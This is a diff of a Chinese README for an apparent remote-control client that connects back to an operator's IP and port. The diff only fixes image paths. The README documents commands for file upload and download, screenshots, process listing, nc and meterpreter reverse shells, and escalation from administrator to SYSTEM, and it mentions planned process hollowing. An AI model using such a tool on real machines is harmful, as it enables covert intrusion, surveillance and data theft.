@@ -13,47 +13,47 @@
 
 启动Client.exe，格式  `Client.exe ip port`。示例`Client.exe 192.168.0.1 3333`。将会连接192.168.0.1的3333端口
 
- <img src="C:\Users\Lion\Desktop\1\3.jpg">
+ <img src="image\3.jpg">
 
 
 ### 支持功能
 #### help
 查看支持命令, 格式 `help`
-<img src="C:\Users\Lion\Desktop\1\11.jpg">
+<img src="image\11.jpg">
 
 #### upload
 上传本地文件到对方机器。格式  `upload filepath`。
-<img src="C:\Users\Lion\Desktop\1\1.jpg">
+<img src="image\1.jpg">
 
 #### download
 
 下载对方机器文件到本地。格式  `download filepath`。
-<img src="C:\Users\Lion\Desktop\1\2.jpg">
+<img src="image\2.jpg">
 
 #### ps
 列出正在运行的进程，格式 `ps`
-<img src="C:\Users\Lion\Desktop\1\4.jpg">
+<img src="image\4.jpg">
 
 #### getpid
 获取当前进程pid，格式 `getpid`
-<img src="C:\Users\Lion\Desktop\1\5.jpg">
+<img src="image\5.jpg">
 
 #### drive
 列出盘符，格式 `drive`
-<img src="C:\Users\Lion\Desktop\1\6.jpg">
+<img src="image\6.jpg">
 
 #### screen
 屏幕截图，格式 `screen`
-<img src="C:\Users\Lion\Desktop\1\7.jpg">
+<img src="image\7.jpg">
 #### nc
 反弹nc，格式 `nc ip port`
-<img src="C:\Users\Lion\Desktop\1\8.jpg">
+<img src="image\8.jpg">
 #### msf
 反弹msf，仅支持`windows/meterpreter/reverse_tcp`，格式 `msf ip port`
-<img src="C:\Users\Lion\Desktop\1\9.jpg">
+<img src="image\9.jpg">
 #### getsystem
 从管理员提权到system，格式 `getsystem`，如果提权成功会打开一个新窗口
-<img src="C:\Users\Lion\Desktop\1\10.jpg">
+<img src="image\10.jpg">
 
 ### 待完善
 1.反弹msf功能，因为在client.exe启动了一个msf的子线程，所以msf退出或者client.exe退出。都会导致对方程序崩溃，后续会考虑使用傀儡进程
